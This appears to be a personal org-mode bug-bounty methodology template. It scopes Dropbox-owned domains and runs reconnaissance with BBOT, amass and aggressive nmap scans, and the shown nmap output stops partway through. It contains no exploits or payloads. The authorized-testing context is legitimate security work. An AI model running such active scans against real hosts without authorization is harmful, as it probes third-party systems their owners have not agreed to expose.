@@ -1,0 +1,1347 @@
+:PROPERTIES:
+:ID:       c5112feb-9a35-4bd0-8406-0e8358b2c07a
+:END:
+#+title: bug bounty methods
+#+CREATED: [2023-11-07 Tue 09:35]
+#+LAST_MODIFIED: [2023-12-09 Sat 10:40]
+#+STARTUP: overview
+
++ Version: 0.4
+* About
+Some of this is stolen from jhaddix as a seed to start my own.
+jhaddix Would like to say thank you for some of your tips you have given online
+
+This is also a template so be sure to copy this!
+
+Some other links
++ https://github.com/jhaddix/tbhm/tree/master
++ https://owasp.org/www-project-web-security-testing-guide/v42/
+
+** Where to put outputs?
+Outputs of the steps here are ment to be put in the same heading or under a "finding" heading.
+Scan results go into PWD/scans/<date>/tool/output
+
+
+
+
+
+* Setup
+Copy This to hackmode working dir.
+#+begin_src emacs-lisp
+(let ((this buffer-file-name)
+      (path (hackmode-get-operation-path hackmode-operation)))
+  (f-copy this (f-join path "steps.org")))
+#+end_src
+
+#+RESULTS:
+
+Download fresh proxy chains config to my working dir
+This is from my node red setup.
+#+begin_src shell :results silent
+curl http://10.50.50.18:1880/proxychain --output proxychains.conf -silent
+#+end_src
+
+
+** Scope
+
+
+#+NAME: SCOPE
+| target           | In Scope (True or false) | Notes if any |
+|------------------+--------------------------+--------------|
+| dropbox.com      | true                     |              |
+| hellosign.com    | true                     |              |
+| helloworks.com   | true                     |              |
+| hellofax.com     | true                     |              |
+| dropboxforum.com | true                     |              |
+| docsend.com      | true                     |              |
+| dropboxer.net    | true                     |              |
+Some code to export t
+#+begin_src elisp :var tbl=SCOPE :file targets.txt :results value file :file  targets.txt :exports results
+
+(mapconcat 'identity  (cl-loop for entry in tbl
+                              if (s-contains? "true" (downcase (nth 1 entry)))
+                              collect (format "%s" (nth 0 entry))) "\n")
+
+#+end_src
+
+#+RESULTS:
+[[file:targets.txt]]
+
+
+Set lisp scope var
+#+begin_src lisp :session hackmode :var tbl=SCOPE
+(setq *scope* (loop for entry in tbl
+                   if (str:containsp "true" (downcase (nth 1 entry)))
+                     collect (format "~a" (nth 0 entry))))
+#+end_src
+
+
+Submit targets to scanning automation.
+#+begin_src sh  :results output replace :var filename="targets.txt"
+#!/bin/bash
+    while IFS= read -r line; do
+        curl http://10.50.50.18:1880/target/add -d "{\"target\": \"$line\"}" -H "Content-Type: application/json"
+    done < "$filename"
+
+#+end_src
+
+#+RESULTS:
+: {"target":"dropbox.com"}{"target":"hellosign.com"}{"target":"helloworks.com"}{"target":"hellofax.com"}{"target":"dropboxforum.com"}{"target":"docsend.com"}
+
+
+
+Hackerone scope import
+#+begin_src elisp :var tbl=SCOPE :file targets.txt
+
+
+(dolist (entry (cl-loop for entry in tbl
+                        if (str:contains "true" (downcase (nth 4 entry)))
+                        collect (cons (nth 1 entry) (nth 0 entry))))
+  (let ((value (cdr entry)))
+    (when (stringp (car entry))
+      (let ((file-name (car entry)))
+        (with-temp-buffer
+          (insert (concat value "\n"))
+          (append-to-file (point-min) (point-max) (format "%s.txt" file-name)))))))
+
+
+;; (dolist (entry (cl-loop for entry in tbl
+;;                 if (s-contains? "true" (downcase (nth 4 entry)))
+;;                 collect (cons (nth 1 entry) (nth 0 entry))))
+;;   (let ((value (cdr entry)))
+;;     (message "%s"  entry)
+;;     (when (stringp (car entry))
+;;       (let ((file-name (car entry)))
+;;         (with-temp-file (format "%s.txt" file-name)
+;;           (insert (cdr entry) "\n"))))))
+
+
+#+end_src
+
+
+Hackerone set lisp scope var
+#+begin_src lisp :session=hackmode :var tbl=SCOPE
+(setq *scope-alist* (loop for entry in tbl
+                   if (str:containsp "true" (downcase (nth 4 entry)))
+                     collect (cons (nth 1 entry) (nth 0 entry))))
+(defun get-scope-type (type)
+  (loop for (key value) in *scope*
+        if (string-equal (downcase type) key)
+          collect value))
+
+#+end_src
+
+#+begin_src lisp :session=hackmode :var scope-type="domain"
+(setq *scope* (get-scope-type scope-type))
+#+end_src
+
+
+* TODO Recon [0/0] :recon:
+** TODO Apex Domains :dns:
+*** DONE Check mdi :apex:
+#+NAME: mdi-domains
+| Domain                        |
+| corpops.mail.onmicrosoft.com  |
+| corpops.onmicrosoft.com       |
+| docsend.com                   |
+| docsend.onmicrosoft.com       |
+| dropbox.com                   |
+| Hellofax.mail.onmicrosoft.com |
+| Hellofax.onmicrosoft.com      |
+| hellosign.com                 |
+| vdi.epe.dropboxer.net         |
+
+*** TODO Reverse Whois :whois:
+*** STRT Spider :spider:
+Spidering can find other apex domains
+
+
+** TODO BBOT
+#+begin_src sh :async t :results none
+/home/unseen/Documents/hackmode-tools/bbot.sh ./targets.txt 
+#+end_src
+** TODO IP :ip:
+
+*** TODO ASN [1/3]
++ [ ] https://bgp.he.net/
++ [X] BBOT
++ [ ] https://hackertarget.com/as-ip-lookup/
+#+Name: asn   
+| ip                          | range              | asd     | org                      |      |
+| 162.125.248.18              | 162.125.248.0/24   | AS19679 | Dropbox                  | Inc. |
+| 162.125.248.18              | 162.125.0.0/16     | AS19679 | Dropbox                  | Inc. |
+| 2620:100:6040:18::a27d:f812 | 2620:100:6040::/48 | AS19679 | Dropbox                  | Inc. |
+| 2620:100:6040:18::a27d:f812 | 2620:100:6000::/40 | AS19679 | Dropbox                  | Inc. |
+| 2620:100:6040:18::a27d:f812 | 2620::/23          | AS13030 | Init7 (Switzerland) Ltd. |      |
+
+**** TODO Ammas
+#+NAME: ORGS
+| Org Names |
+|-----------|
+| dropbox.com |
+
+#+begin_src sh :async :var tbl=ORGS :results output replace
+for org in "$tbl"; do
+ amass intel -org "$org"
+done
+#+end_src
+
+#+RESULTS:
+
+*** TODO Nmap
+maybe find an admin panel or something?
+
+#+begin_src sh :async :results output replace
+nmap -A -iL targets.txt
+#+end_src
+
+#+RESULTS:
+#+begin_example
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-01 00:11 EST
+Nmap scan report for dropbox.com (162.125.248.18)
+Host is up (0.084s latency).
+Other addresses for dropbox.com (not scanned): 2620:100:6040:18::a27d:f812
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE   VERSION
+80/tcp  open  http      envoy
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 426 Upgrade Required
+|     content-length: 1005
+|     content-type: text/html
+|     date: Fri, 01 Dec 2023 05:12:12 GMT
+|     server: envoy
+|     connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 426</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 426"/>
+|     </div>
+|     <div id="errorbox">
+|     <h1>Error (426)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https://status.dropbox.com">Status
+|   HTTPOptions: 
+|     HTTP/1.1 426 Upgrade Required
+|     content-length: 1005
+|     content-type: text/html
+|     date: Fri, 01 Dec 2023 05:12:13 GMT
+|     server: envoy
+|     connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 426</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 426"/>
+|     </div>
+|     <div id="errorbox">
+|_    <h1>Error (426)</h1>Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified. Check out our <a href="https://status.dropbox.com">Status
+|_http-server-header: envoy
+|_http-title: Did not follow redirect to https://dropbox.com/
+443/tcp open  ssl/https envoy
+| ssl-cert: Subject: commonName=*.dropbox.com/organizationName=Dropbox, Inc/stateOrProvinceName=California/countryName=US
+| Subject Alternative Name: DNS:*.dropbox.com, DNS:dropbox.com
+| Not valid before: 2023-10-31T00:00:00
+|_Not valid after:  2024-11-30T23:59:59
+|_ssl-date: 2023-12-01T05:13:32+00:00; -1s from scanner time.
+|_http-server-header: envoy
+|_http-title: Did not follow redirect to https://www.dropbox.com/
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 1005
+|     Content-Type: text/html
+|     Cache-Control: no-cache, no-store
+|     Vary: Accept-Encoding
+|     X-Dropbox-Response-Origin: local
+|     Date: Fri, 01 Dec 2023 05:12:19 GMT
+|     Server: envoy
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 400</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 400"/>
+|     </div>
+|     <div id="errorbox">
+|     <h1>Error (400)</h1>Something went wrong. Don't worry, your files are still safe and the Dro
+|   HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Length: 1005
+|     Content-Type: text/html
+|     Cache-Control: no-cache, no-store
+|     Vary: Accept-Encoding
+|     X-Dropbox-Response-Origin: local
+|     Date: Fri, 01 Dec 2023 05:12:20 GMT
+|     Server: envoy
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html>
+|     <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1" />
+|     <title>Dropbox - 400</title>
+|     <link href="https://cfl.dropboxstatic.com/static/metaserver/static/css/error.css" rel="stylesheet" type="text/css"/>
+|     <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
+|     </head>
+|     <body>
+|     <div class="figure">
+|     <img src="https://assets.dropbox.com/www/en-us/illustrations/spot/target-miss.svg" alt="Error: 400"/>
+|     </div>
+|     <div id="errorbox">
+|_    <h1>Error (400)</h1>Something went wrong. Don't worry, your files are still safe and the Dro
+| tls-alpn: 
+|   h2
+|_  http/1.1
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94%I=7%D=12/1%Time=65696B2E%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,484,"HTTP/1\.1\x20426\x20Upgrade\x20Required\r\ncontent-length:\
+SF:x201005\r\ncontent-type:\x20text/html\r\ndate:\x20Fri,\x2001\x20Dec\x20
+SF:2023\x2005:12:12\x20GMT\r\nserver:\x20envoy\r\nconnection:\x20close\r\n
+SF:\r\n<!DOCTYPE\x20html>\n<html>\n<head><meta\x20http-equiv=\"Content-Typ
+SF:e\"\x20content=\"text/html;\x20charset=utf-8\">\n<meta\x20name=\"viewpo
+SF:rt\"\x20content=\"width=device-width,\x20initial-scale=1\"\x20/>\n<titl
+SF:e>Dropbox\x20-\x20426</title>\n<link\x20href=\"https://cfl\.dropboxstat
+SF:ic\.com/static/metaserver/static/css/error\.css\"\x20rel=\"stylesheet\"
+SF:\x20type=\"text/css\"/>\n<link\x20rel=\"shortcut\x20icon\"\x20href=\"ht
+SF:tps://cfl\.dropboxstatic\.com/static/images/favicon\.ico\"/>\n</head>\n
+SF:<body>\n<div\x20class=\"figure\">\n<img\x20src=\"https://assets\.dropbo
+SF:x\.com/www/en-us/illustrations/spot/target-miss\.svg\"\x20alt=\"Error:\
+SF:x20426\"/>\n</div>\n<div\x20id=\"errorbox\">\n<h1>Error\x20\(426\)</h1>
+SF:Something\x20went\x20wrong\.\x20Don't\x20worry,\x20your\x20files\x20are
+SF:\x20still\x20safe\x20and\x20the\x20Dropbox\x20team\x20has\x20been\x20no
+SF:tified\.\x20Check\x20out\x20our\x20<a\x20href=\"https://status\.dropbox
+SF:\.com\">Status\x20")%r(HTTPOptions,484,"HTTP/1\.1\x20426\x20Upgrade\x20
+SF:Required\r\ncontent-length:\x201005\r\ncontent-type:\x20text/html\r\nda
+SF:te:\x20Fri,\x2001\x20Dec\x202023\x2005:12:13\x20GMT\r\nserver:\x20envoy
+SF:\r\nconnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head><meta
+SF:\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf-
+SF:8\">\n<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20in
+SF:itial-scale=1\"\x20/>\n<title>Dropbox\x20-\x20426</title>\n<link\x20hre
+SF:f=\"https://cfl\.dropboxstatic\.com/static/metaserver/static/css/error\
+SF:.css\"\x20rel=\"stylesheet\"\x20type=\"text/css\"/>\n<link\x20rel=\"sho
+SF:rtcut\x20icon\"\x20href=\"https://cfl\.dropboxstatic\.com/static/images
+SF:/favicon\.ico\"/>\n</head>\n<body>\n<div\x20class=\"figure\">\n<img\x20
+SF:src=\"https://assets\.dropbox\.com/www/en-us/illustrations/spot/target-
+SF:miss\.svg\"\x20alt=\"Error:\x20426\"/>\n</div>\n<div\x20id=\"errorbox\"
+SF:>\n<h1>Error\x20\(426\)</h1>Something\x20went\x20wrong\.\x20Don't\x20wo
+SF:rry,\x20your\x20files\x20are\x20still\x20safe\x20and\x20the\x20Dropbox\
+SF:x20team\x20has\x20been\x20notified\.\x20Check\x20out\x20our\x20<a\x20hr
+SF:ef=\"https://status\.dropbox\.com\">Status\x20");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.94%T=SSL%I=7%D=12/1%Time=65696B34%P=x86_64-pc-linux-gnu
+SF:%r(GetRequest,4DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x201005\r\nContent-Type:\x20text/html\r\nCache-Control:\x20no-cache,\
+SF:x20no-store\r\nVary:\x20Accept-Encoding\r\nX-Dropbox-Response-Origin:\x
+SF:20local\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:19\x20GMT\r\nSer
+SF:ver:\x20envoy\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>
+SF:\n<head><meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x2
+SF:0charset=utf-8\">\n<meta\x20name=\"viewport\"\x20content=\"width=device
+SF:-width,\x20initial-scale=1\"\x20/>\n<title>Dropbox\x20-\x20400</title>\
+SF:n<link\x20href=\"https://cfl\.dropboxstatic\.com/static/metaserver/stat
+SF:ic/css/error\.css\"\x20rel=\"stylesheet\"\x20type=\"text/css\"/>\n<link
+SF:\x20rel=\"shortcut\x20icon\"\x20href=\"https://cfl\.dropboxstatic\.com/
+SF:static/images/favicon\.ico\"/>\n</head>\n<body>\n<div\x20class=\"figure
+SF:\">\n<img\x20src=\"https://assets\.dropbox\.com/www/en-us/illustrations
+SF:/spot/target-miss\.svg\"\x20alt=\"Error:\x20400\"/>\n</div>\n<div\x20id
+SF:=\"errorbox\">\n<h1>Error\x20\(400\)</h1>Something\x20went\x20wrong\.\x
+SF:20Don't\x20worry,\x20your\x20files\x20are\x20still\x20safe\x20and\x20th
+SF:e\x20Dro")%r(HTTPOptions,4DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Length:\x201005\r\nContent-Type:\x20text/html\r\nCache-Control:\x2
+SF:0no-cache,\x20no-store\r\nVary:\x20Accept-Encoding\r\nX-Dropbox-Respons
+SF:e-Origin:\x20local\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:20\x2
+SF:0GMT\r\nServer:\x20envoy\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
+SF:ml>\n<html>\n<head><meta\x20http-equiv=\"Content-Type\"\x20content=\"te
+SF:xt/html;\x20charset=utf-8\">\n<meta\x20name=\"viewport\"\x20content=\"w
+SF:idth=device-width,\x20initial-scale=1\"\x20/>\n<title>Dropbox\x20-\x204
+SF:00</title>\n<link\x20href=\"https://cfl\.dropboxstatic\.com/static/meta
+SF:server/static/css/error\.css\"\x20rel=\"stylesheet\"\x20type=\"text/css
+SF:\"/>\n<link\x20rel=\"shortcut\x20icon\"\x20href=\"https://cfl\.dropboxs
+SF:tatic\.com/static/images/favicon\.ico\"/>\n</head>\n<body>\n<div\x20cla
+SF:ss=\"figure\">\n<img\x20src=\"https://assets\.dropbox\.com/www/en-us/il
+SF:lustrations/spot/target-miss\.svg\"\x20alt=\"Error:\x20400\"/>\n</div>\
+SF:n<div\x20id=\"errorbox\">\n<h1>Error\x20\(400\)</h1>Something\x20went\x
+SF:20wrong\.\x20Don't\x20worry,\x20your\x20files\x20are\x20still\x20safe\x
+SF:20and\x20the\x20Dro");
+
+Host script results:
+|_clock-skew: -1s
+
+Nmap scan report for hellosign.com (99.83.190.102)
+Host is up (0.082s latency).
+Other addresses for hellosign.com (not scanned): 75.2.70.75
+rDNS record for 99.83.190.102: aacb0a264e514dd48.awsglobalaccelerator.com
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE   VERSION
+80/tcp  open  http
+|_http-title: Did not follow redirect to https://hellosign.com/
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 301 Moved Permanently
+|     Date: Fri, 01 Dec 2023 05:12:10 GMT
+|     Content-Type: text/html
+|     Content-Length: 166
+|     Connection: close
+|     Location: https:///nice%20ports%2C/Tri%6Eity.txt%2ebak
+|     <html>
+|     <head><title>301 Moved Permanently</title></head>
+|     <body>
+|     <center><h1>301 Moved Permanently</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 301 Moved Permanently
+|     Date: Fri, 01 Dec 2023 05:12:10 GMT
+|     Content-Type: text/html
+|     Content-Length: 166
+|     Connection: close
+|     Location: https:///
+|     <html>
+|     <head><title>301 Moved Permanently</title></head>
+|     <body>
+|     <center><h1>301 Moved Permanently</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   RPCCheck: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Fri, 01 Dec 2023 05:12:14 GMT
+|     Content-Type: text/html
+|     Content-Length: 154
+|     Connection: close
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   RTSPRequest: 
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Fri, 01 Dec 2023 05:12:10 GMT
+|     Content-Type: text/html
+|     Content-Length: 154
+|     Connection: close
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|_    </html>
+443/tcp open  ssl/https
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions: 
+|     HTTP/1.1 403 Forbidden
+|     Date: Fri, 01 Dec 2023 05:12:14 GMT
+|     Content-Type: text/html
+|     Content-Length: 150
+|     Connection: close
+|     <html>
+|     <head><title>403 Forbidden</title></head>
+|     <body>
+|     <center><h1>403 Forbidden</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.1 403 Forbidden
+|     Date: Fri, 01 Dec 2023 05:12:13 GMT
+|     Content-Type: text/html
+|     Content-Length: 150
+|     Connection: close
+|     <html>
+|     <head><title>403 Forbidden</title></head>
+|     <body>
+|     <center><h1>403 Forbidden</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   RPCCheck: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Fri, 01 Dec 2023 05:12:19 GMT
+|     Content-Type: text/html
+|     Content-Length: 154
+|     Connection: close
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   RTSPRequest: 
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|     </html>
+|   tor-versions: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Fri, 01 Dec 2023 05:12:15 GMT
+|     Content-Type: text/html
+|     Content-Length: 154
+|     Connection: close
+|     <html>
+|     <head><title>400 Bad Request</title></head>
+|     <body>
+|     <center><h1>400 Bad Request</h1></center>
+|     <hr><center>openresty</center>
+|     </body>
+|_    </html>
+|_http-title: Did not follow redirect to https://www.hellosign.com/
+| ssl-cert: Subject: commonName=hellosign.com
+| Subject Alternative Name: DNS:hellosign.com
+| Not valid before: 2023-10-08T11:12:48
+|_Not valid after:  2024-01-06T11:12:47
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94%I=7%D=12/1%Time=65696B2A%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,143,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nDate:\x20Fri,\x
+SF:2001\x20Dec\x202023\x2005:12:10\x20GMT\r\nContent-Type:\x20text/html\r\
+SF:nContent-Length:\x20166\r\nConnection:\x20close\r\nLocation:\x20https:/
+SF://\r\n\r\n<html>\r\n<head><title>301\x20Moved\x20Permanently</title></h
+SF:ead>\r\n<body>\r\n<center><h1>301\x20Moved\x20Permanently</h1></center>
+SF:\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n")%r(HTTPOp
+SF:tions,143,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nDate:\x20Fri,\x2
+SF:001\x20Dec\x202023\x2005:12:10\x20GMT\r\nContent-Type:\x20text/html\r\n
+SF:Content-Length:\x20166\r\nConnection:\x20close\r\nLocation:\x20https://
+SF:/\r\n\r\n<html>\r\n<head><title>301\x20Moved\x20Permanently</title></he
+SF:ad>\r\n<body>\r\n<center><h1>301\x20Moved\x20Permanently</h1></center>\
+SF:r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n")%r(RTSPReq
+SF:uest,9A,"<html>\r\n<head><title>400\x20Bad\x20Request</title></head>\r\
+SF:n<body>\r\n<center><h1>400\x20Bad\x20Request</h1></center>\r\n<hr><cent
+SF:er>openresty</center>\r\n</body>\r\n</html>\r\n")%r(X11Probe,11C,"HTTP/
+SF:1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x20
+SF:05:12:10\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x20154
+SF:\r\nConnection:\x20close\r\n\r\n<html>\r\n<head><title>400\x20Bad\x20Re
+SF:quest</title></head>\r\n<body>\r\n<center><h1>400\x20Bad\x20Request</h1
+SF:></center>\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n"
+SF:)%r(FourOhFourRequest,166,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\n
+SF:Date:\x20Fri,\x2001\x20Dec\x202023\x2005:12:10\x20GMT\r\nContent-Type:\
+SF:x20text/html\r\nContent-Length:\x20166\r\nConnection:\x20close\r\nLocat
+SF:ion:\x20https:///nice%20ports%2C/Tri%6Eity\.txt%2ebak\r\n\r\n<html>\r\n
+SF:<head><title>301\x20Moved\x20Permanently</title></head>\r\n<body>\r\n<c
+SF:enter><h1>301\x20Moved\x20Permanently</h1></center>\r\n<hr><center>open
+SF:resty</center>\r\n</body>\r\n</html>\r\n")%r(RPCCheck,11C,"HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:1
+SF:4\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x20154\r\nCon
+SF:nection:\x20close\r\n\r\n<html>\r\n<head><title>400\x20Bad\x20Request</
+SF:title></head>\r\n<body>\r\n<center><h1>400\x20Bad\x20Request</h1></cent
+SF:er>\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.94%T=SSL%I=7%D=12/1%Time=65696B2D%P=x86_64-pc-linux-gnu
+SF:%r(GetRequest,116,"HTTP/1\.1\x20403\x20Forbidden\r\nDate:\x20Fri,\x2001
+SF:\x20Dec\x202023\x2005:12:13\x20GMT\r\nContent-Type:\x20text/html\r\nCon
+SF:tent-Length:\x20150\r\nConnection:\x20close\r\n\r\n<html>\r\n<head><tit
+SF:le>403\x20Forbidden</title></head>\r\n<body>\r\n<center><h1>403\x20Forb
+SF:idden</h1></center>\r\n<hr><center>openresty</center>\r\n</body>\r\n</h
+SF:tml>\r\n")%r(HTTPOptions,116,"HTTP/1\.1\x20403\x20Forbidden\r\nDate:\x2
+SF:0Fri,\x2001\x20Dec\x202023\x2005:12:14\x20GMT\r\nContent-Type:\x20text/
+SF:html\r\nContent-Length:\x20150\r\nConnection:\x20close\r\n\r\n<html>\r\
+SF:n<head><title>403\x20Forbidden</title></head>\r\n<body>\r\n<center><h1>
+SF:403\x20Forbidden</h1></center>\r\n<hr><center>openresty</center>\r\n</b
+SF:ody>\r\n</html>\r\n")%r(FourOhFourRequest,116,"HTTP/1\.1\x20403\x20Forb
+SF:idden\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:14\x20GMT\r\nConte
+SF:nt-Type:\x20text/html\r\nContent-Length:\x20150\r\nConnection:\x20close
+SF:\r\n\r\n<html>\r\n<head><title>403\x20Forbidden</title></head>\r\n<body
+SF:>\r\n<center><h1>403\x20Forbidden</h1></center>\r\n<hr><center>openrest
+SF:y</center>\r\n</body>\r\n</html>\r\n")%r(tor-versions,11C,"HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nDate:\x20Fri,\x2001\x20Dec\x202023\x2005:12:1
+SF:5\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x20154\r\nCon
+SF:nection:\x20close\r\n\r\n<html>\r\n<head><title>400\x20Bad\x20Request</
+SF:title></head>\r\n<body>\r\n<center><h1>400\x20Bad\x20Request</h1></cent
+SF:er>\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\r\n")%r(RTS
+SF:PRequest,9A,"<html>\r\n<head><title>400\x20Bad\x20Request</title></head
+SF:>\r\n<body>\r\n<center><h1>400\x20Bad\x20Request</h1></center>\r\n<hr><
+SF:center>openresty</center>\r\n</body>\r\n</html>\r\n")%r(RPCCheck,11C,"H
+SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2001\x20Dec\x202023
+SF:\x2005:12:19\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x2
+SF:0154\r\nConnection:\x20close\r\n\r\n<html>\r\n<head><title>400\x20Bad\x
+SF:20Request</title></head>\r\n<body>\r\n<center><h1>400\x20Bad\x20Request
+SF:</h1></center>\r\n<hr><center>openresty</center>\r\n</body>\r\n</html>\
+SF:r\n");
+
+Nmap scan report for helloworks.com (99.83.190.102)
+Host is up (0.083s latency).
+Other addresses for helloworks.com (not scanned): 75.2.70.75
+rDNS record for 99.83.190.102: aacb0a264e514dd48.awsglobalaccelerator.com
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE        VERSION
+80/tcp  open  tcpwrapped
+|_http-title: Did not follow redirect to https://helloworks.com/
+443/tcp open  ssl/tcpwrapped
+| ssl-cert: Subject: commonName=helloworks.com
+| Subject Alternative Name: DNS:helloworks.com
+| Not valid before: 2023-10-09T09:14:52
+|_Not valid after:  2024-01-07T09:14:51
+|_http-title: Did not follow redirect to https://www.helloworks.com/
+
+Nmap scan report for hellofax.com (75.2.70.75)
+Host is up (0.083s latency).
+Other addresses for hellofax.com (not scanned): 99.83.190.102
+rDNS record for 75.2.70.75: aacb0a264e514dd48.awsglobalaccelerator.com
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE        VERSION
+80/tcp  open  tcpwrapped
+|_http-title: Did not follow redirect to https://hellofax.com/
+443/tcp open  ssl/tcpwrapped
+| ssl-cert: Subject: commonName=hellofax.com
+| Subject Alternative Name: DNS:hellofax.com
+| Not valid before: 2023-11-04T12:19:56
+|_Not valid after:  2024-02-02T12:19:55
+|_http-title: Did not follow redirect to https://www.hellofax.com/
+
+Nmap scan report for dropboxforum.com (13.226.22.36)
+Host is up (0.15s latency).
+Other addresses for dropboxforum.com (not scanned): 13.226.22.103 13.226.22.119 13.226.22.56
+rDNS record for 13.226.22.36: server-13-226-22-36.ord51.r.cloudfront.net
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Amazon CloudFront httpd
+|_http-title: Did not follow redirect to https://dropboxforum.com/
+|_http-server-header: CloudFront
+443/tcp open  ssl/http Amazon CloudFront httpd
+| http-server-header: 
+|   AmazonS3
+|_  CloudFront
